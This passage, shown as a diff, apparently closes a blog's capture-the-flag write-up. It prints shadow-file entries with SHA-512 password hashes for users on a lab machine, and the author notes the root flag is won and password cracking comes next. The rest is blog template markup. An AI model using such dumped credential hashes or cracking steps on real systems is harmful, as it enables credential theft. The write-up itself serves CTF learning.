+rosa:$6$giyD4I2YumzG4k6.$0h0Gtrjj13qoK6m0XevedDBanbEz6BStzsLwUtrDm5sVkmnHOSSWF8f6W8B9btTEzyskmA2h/7F7gyvX1fzrT0:19893:0:99999:7:::
+lxd:!:19889::::::
+app:$6$XUL17hADm4qICsPv$QvCHMOImUTmS1jiaTQ2t6ZJtDAzgkqRhFYOMd0nty3lLwpyxTiyMWRgO/jbySPENinpJlL0z3MK1OVEaG44sQ1:19890:0:99999:7:::
+_laurel:!:20007::::::
+
+</code></pre></div><p>Got the root flag, but let&rsquo;s try to crack root password anyway</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"></code></pre></div>
+    </div>
+
+    
+    
+    
+  <div id="comment">
+    
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "your-disqus-shortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+
+
+</section>
+
+
+    </main>
+    
+    <footer id="footer">
+    
+        <div id="social">
+
+
+    <a class="symbol" href="https://github.com/v3l1d" rel="me" target="_blank">
+        
+        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    
+    <title>Github</title>
+    <desc>Created with Sketch.</desc>
+    <defs></defs>
+    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
+            <g id="Github" transform="translate(264.000000, 939.000000)">
+                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
+                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
+            </g>
+        </g>
+    </g>
+</svg>
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+        ❤️ v3l1d
+    
+    </div>
+
+    
+      <div class="powerby">
+        Powered by <a href='http://www.gohugo.io/'>Hugo</a> Theme By <a href='https://github.com/nodejh/hugo-theme-mini'>nodejh</a>
+      </div>
+    
+</footer>
+
+
+
+  </body>
+</html>
